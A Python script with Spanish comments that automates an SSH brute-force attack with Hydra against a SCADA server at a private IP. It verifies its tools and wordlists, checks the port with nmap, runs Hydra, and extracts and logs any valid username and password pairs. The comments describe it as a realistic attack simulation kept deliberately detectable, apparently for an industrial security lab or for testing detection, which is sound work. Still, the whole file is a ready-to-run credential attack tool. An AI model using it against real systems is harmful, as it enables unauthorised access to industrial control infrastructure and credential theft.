#!/usr/bin/env python3
"""
Script de fuerza bruta SSH para entornos industriales.
Objetivo: Simular un ataque realista de credential stuffing/brute force
contra el servidor SCADA usando Hydra.
"""
 
import subprocess
import os
import sys
import re
from datetime import datetime
 
# --- CONFIGURACIÓN ---
TARGET_IP = "192.168.201.3"       # IP del servidor SCADA
TARGET_PORT = "22"                  # Puerto SSH interno
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
OUTPUT_DIR = os.path.join(SCRIPT_DIR, "./hydra")              # Ruta relativa dentro de /scripts
USERS_FILE = os.path.join(SCRIPT_DIR, "wordlists", "users.txt")
PASSWORDS_FILE = os.path.join(SCRIPT_DIR, "wordlists", "passwords.txt")
HYDRA_THREADS = "2"                 # Hilos paralelos (-t). Bajo a propósito
                                     # para generar un patrón de tráfico claro
                                     # y detectable, no agresivo/irreal.
 
# --- FUNCIONES ---
def log_message(message, level="INFO"):
    """Imprime un mensaje con timestamp y nivel de log."""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print(f"[{timestamp}] [{level}] {message}")
 
def check_hydra():
    """Verifica que Hydra esté instalado."""
    try:
        subprocess.run(["hydra", "-h"], check=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        log_message("Hydra está disponible.")
    except FileNotFoundError:
        log_message("Hydra no está instalado en este contenedor.", "ERROR")
        sys.exit(1)
 
def check_wordlists():
    """Verifica que las wordlists existan antes de lanzar el ataque."""
    for f in [USERS_FILE, PASSWORDS_FILE]:
        if not os.path.isfile(f):
            log_message(f"No se encuentra la wordlist: {f}", "ERROR")
            sys.exit(1)
    log_message("Wordlists verificadas correctamente.")
 
def check_connectivity(host, port):
    """Comprueba que el host objetivo responde en el puerto SSH antes de atacar."""
    log_message(f"Verificando conectividad con {host}:{port}...")
    cmd = ["nmap", "-p", port, "--open", host]
    try:
        result = subprocess.run(cmd, check=True, capture_output=True, text=True)
        if "open" in result.stdout:
            log_message(f"Puerto {port} abierto en {host}. Procediendo con el ataque.")
            return True
        else:
            log_message(f"Puerto {port} no parece estar abierto en {host}.", "WARNING")
            return False
    except subprocess.CalledProcessError as e:
        log_message(f"Error al comprobar conectividad: {e.stderr}", "ERROR")
        return False
 
def run_hydra_attack(host, port, users_file, passwords_file, output_dir):
    """Ejecuta el ataque de fuerza bruta SSH con Hydra."""
    os.makedirs(output_dir, exist_ok=True)
    timestamp_file = datetime.now().strftime("%Y%m%d_%H%M%S")
    output_file = os.path.join(output_dir, f"hydra_ssh_{host.replace('.', '_')}_{timestamp_file}.txt")
 
    cmd = [
        "hydra",
        "-L", users_file,
        "-P", passwords_file,
        "-t", HYDRA_THREADS,
        "-o", output_file,
        "-f",  # Detener en cuanto se encuentre la primera combinación válida
        "-V",  # Verbose: muestra cada intento en pantalla
        f"ssh://{host}:{port}"
    ]
 
    log_message(f"Iniciando ataque de fuerza bruta SSH contra {host}:{port}...")
    log_message(f"Usuarios: {users_file} | Contraseñas: {passwords_file}")
    log_message(f"Comando: {' '.join(cmd)}")
 
    start_time = datetime.now()
    try:
        result = subprocess.run(cmd, capture_output=True, text=True)
        elapsed = (datetime.now() - start_time).total_seconds()
        log_message(f"Ataque finalizado en {elapsed:.2f} segundos.")
 
        # Hydra devuelve distintos códigos según si encontró credenciales o no,
        # por eso no usamos check=True y analizamos la salida manualmente.
        print(result.stdout)
 
        return parse_hydra_output(result.stdout, output_file)
 
    except Exception as e:
        log_message(f"Error inesperado al ejecutar Hydra: {e}", "ERROR")
        return None
 
def parse_hydra_output(stdout, output_file):
    """Extrae las credenciales encontradas de la salida de Hydra."""
    found_credentials = []
    pattern = re.compile(r"login:\s*(\S+)\s+password:\s*(\S+)")
 
    for line in stdout.split("\n"):
        match = pattern.search(line)
        if match:
            user, password = match.groups()
            found_credentials.append((user, password))
            log_message(f"Credenciales válidas encontradas -> usuario: {user} | contraseña: {password}", "SUCCESS")
 
    if not found_credentials:
        log_message("No se encontraron credenciales válidas en este intento.", "WARNING")
 
    log_message(f"Resultados completos guardados en: {output_file}")
    return found_credentials
 
def main():
    try:
        log_message("=== Iniciando módulo de fuerza bruta SSH ===")
 
        check_hydra()
        check_wordlists()
 
        if not check_connectivity(TARGET_IP, TARGET_PORT):
            log_message("Abortando ataque: el objetivo no responde en el puerto esperado.", "ERROR")
            return
 
        credentials = run_hydra_attack(
            TARGET_IP, TARGET_PORT, USERS_FILE, PASSWORDS_FILE, OUTPUT_DIR
        )
 
        if credentials:
            log_message(f"Ataque completado con éxito. Total de credenciales válidas: {len(credentials)}")
        else:
            log_message("Ataque completado sin éxito (ninguna credencial válida encontrada).")
 
    except KeyboardInterrupt:
        log_message("Ataque interrumpido manualmente.", "WARNING")
    except Exception as e:
        log_message(f"Error inesperado: {e}", "ERROR")
 
if __name__ == "__main__":
    main()
 
